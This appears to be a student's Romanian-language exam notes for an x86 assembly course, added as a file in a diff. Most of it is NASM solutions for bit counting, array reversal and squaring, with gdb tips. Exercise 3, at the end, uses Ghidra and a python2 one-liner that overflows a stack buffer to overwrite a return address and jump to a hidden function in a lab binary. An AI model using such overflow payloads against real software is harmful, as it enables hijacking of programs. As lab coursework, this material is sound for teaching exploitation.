@@ -1,0 +1,290 @@
+model 2021-2022 v2 preg CC
+
+salvez scheletele in downloads
+
+cd downloads
+tar xvf 1_djjddkdk.tar
+tar xvf 2_ddkdd.tar
+tar xvf 3_kkd
+cd 1
+code . ?? ca sa deschid vscode
+
+sa nu uit sa pun extern printf
+
+
+ex 1
+
+a) mov eax, [num]
+   shr eax, 16
+   // si ajung 0x67 78 adica iimi aduc in dreapta
+   mov edx, eax // edx cel mai putin semnificativ bit
+
+   shr eax, 1
+   and eax, 1 //eax al doilea cel mai putin semnificativ bit
+
+   PRINTF32 `a %d%d\0`, eax, edx
+
+
+b) mov eax, [num]
+   xor ecx, ecx // ecx nr biti de 1 setati pe pozitii pare
+   mov edx, 1 // edx masca bitului de pe poz para
+   
+loop_b:
+   test eax, edx
+   jz skip_add // bitul care e ilustrat de masca e setat pe 0
+
+   inc ecx
+
+skip_add:
+   shl edx, 2 // shiftez la st masca ca sa imi reprezinte al doilea bit de pe poz para
+   test edx, edx
+   jnz loop_b
+
+   PRINTF32 `b %d\n\0`, ecx
+
+num -> 0x87 87 87 54
+edx -> 0b00000...001
+si il duc 
+    -> 0b00000...100
+
+
+c) push ebx
+   mov eax, [num]
+   xor ecx, ecx // ecx nr grupari 3 biti consec de 1
+   xor ebx, ebx // ebx nr biti de 1 din gruparea curenta
+   
+   mov edx, 1 // edx masca bitului curent
+
+loop_c:
+   test eax, edx // verific starea bitului
+   jz c_bit0 // dc e bit 0
+
+   inc ebx
+   cmp ebx, 3
+   jge inc_ecx
+
+   jmp loop_c_fin
+
+inc_ecx:
+   inc ecx
+   jmp loop_c_fin
+
+c_bit0:
+   xor ebx, ebx // ca sa o iau de la capat cu numaratoarea
+
+loop_c_fin:
+   shl edx, 1 // shiftez masca la st
+   // verific daca mi s a terminat spectrul de biti
+
+   test edx, edx
+   jnz loop_c
+
+   PRINTF32 `c %d\n\0`, ecx
+
+   pop ebx
+
+
+
+gdb ./bits
+
+start
+b main
+c -> continuam
+
+
+ex 2
+
+a) sub esp, 20 // aloc pe stiva un vector de 20 de elem de tip byte
+   
+   xor ecx, ecx // contor element curent
+   mov dl, 'A' // cel mai putin semnificativ byte
+
+loop_a:
+   mov byte [esp + ecx], dl 
+   
+   inc ecx
+   inc dl // incrementez caracterul
+
+   cmp ecx, 20
+   jl loop_a // dc ecx < 20 ma intorc in loop_a
+
+   xor ecx, ecx
+   
+loop_a_print:
+   movzx edx, byte [esp + ecx] // printf vrea ca param de dupa sirul de caract sa fie de 4 octeti
+   PRINTF32 `%c\0`, edx
+
+   inc ecx
+   cmp ecx, 20
+   jl loop_a_print
+   
+   PRINTF32 `\n\0` -> newline
+
+gdb ./array
+b main
+r -> rulam
+
+b) 
+in section.data
+   vect_b db 5, 4, 3, 2, 1
+
+array_reverse:
+   push ebp
+   mov ebp, esp
+   pusha
+
+   mov eax, [ebp + 8] // primul argument => eax e vectorul
+   mov edx, [ebp + 12] // al doilea argument => edx e lungimea
+
+   xor ecx, ecx // ecx e indice elem curent de schimbat - stanga
+
+// ala din dr o sa fie lungimea - ecx - 1
+
+   lea esi, [edx - 1] // esi e indice elem schimbat dr
+
+loop_b:
+   ; xchg // nu lucreaza cu 2 adrese dintr o data, trb sa aiba cel putin un registru
+   mov bl, [eax + ecx] // bl e elem din stanga
+   mov bh, [eax + esi] // bh e elem din dr
+
+   mov [eax + ecx], bh // mut pe poz celui din stanga, pe cel din dr
+   mov [eax + esi], bl // invers
+
+   inc ecx
+   dec esi
+
+   cmp ecx, esi
+   jl loop_b
+
+
+   popa
+   leave
+   ret
+
+
+   push 5
+   push vect_b
+   call array_reverse
+   add esp, 8
+   
+   xor ecx, ecx // contor pt parcurgerea vectorului
+
+loop_b_print:
+   movzx eax, byte [vect_b + ecx]
+   PRINTF32 `%hhd \0`, eax  // hhd -> nr pe un octet -> char
+
+   inc ecx
+   cmp ecx, 5
+   jl loop_b_print
+
+
+si cand rulez imi va da 1 2 3 4 5, adica e bine
+
+
+c) 
+in section.data
+   vect_c_src db 3, 8, 1, 6 // dc as pune 200 > 128, e negativ patratul, pt ca cel mai putin semnificativ bit e 1
+
+in section.bss // il pun aici pe cel dest pt ca nu e initializat
+   vect_c_dst resw 4
+
+trb sa imi creez eu semnatura ca sa stiu cum pun argumentele, pt ca nu o am data
+
+// pow_array(char *a, unsigned int len, short *b)
+
+// operatia de inmultiire ne ocupa eax ul
+
+pow_array:
+   push ebp
+   mov ebp, esp
+   pusha
+
+   mov edx, [ebp + 8] // primul argument-> edx este a(sursa)
+   mov ecx, [ebp + 12] // al doilea argument-> ecx este len
+   mov edi, [ebp + 16] // al treilea argument-> edi este b(destinatia)
+
+   xor ebx, ebx // contor pt indicele elem curent
+
+loop_c:
+   mov al, [edx + ebx]
+   mul al -> rezultatul ajunge in ax // interpreteaza argumentul fara semn, daca doream sa fie cu semn, foloseam imul
+   
+   mov word [edi + ebx * 2], ax // word poate fi dedus implicit, dar il pun sa fie, pt 2 octeti
+
+   inc ebx
+   cmp ebx, ecx
+   jl loop_c
+
+   popa
+   leave
+   ret
+
+
+   push vect_c_dst
+   push 4 // lungimea
+   push vect_c_src
+   call pow_array
+   add esp, 12 // curat stiva
+
+   xor ecx, ecx // contor pt parcurgere vector
+
+loop_c_print:
+   movzx eax, word [vect_c_dst + ecx * 2]
+   PRINTF32 `%hd \0`, eax // hd pt ca am short
+   // dc pun d dupa h, imi afiseaza fara semn
+   // dc pun u dupa h, imi afiseaza cu semn
+   
+   inc ecx
+   cmp ecx, 4
+   jl loop_c_print
+   
+   PRINTF32 `\n\0`
+
+
+=> imi va afisa bine patratele
+
+mul bx <=> dx:ax = bx * ax
+
+
+d)
+
+in section.data
+   byte_array db 0xac, 0xad, 0xab, 0xb
+
+-> ca sa imi afiseze babadac
+
+// trb sa stiu ca lucram cu little endian
+
+   mov eax, [byte_array]
+
+
+ex 3
+
+ghidra 
+
+proiect nou
+file import si ii dau import la ala pe care l am downloadat in asta pe care l am fct nou
+
+
+dau in stanga pe functions si ma duc pe main
+
+si ma uit in dreapta la codul in C
+
+ma uit in loc de main la invisible_func sa vad ce i cu ea
+
+in terminal in vscode ma mut in 3 cu cd
+
+si sciru in terminal comanda 
+python2 -c 'print "a" * 89 + "\x76\x84\x04\x08"' | ./attack
+
+sau
+
+python2 -c 'print "a" * (0x55 + 4) + "\x76\x84\x04\x08"' | ./attack
+
+ebp - 0x55 => buffer => fgets
+ebp + 4 => adresa de retur
+
+0x55 este 85 
+85 + 4 e 89
+0x55 + 4 e 89
+   
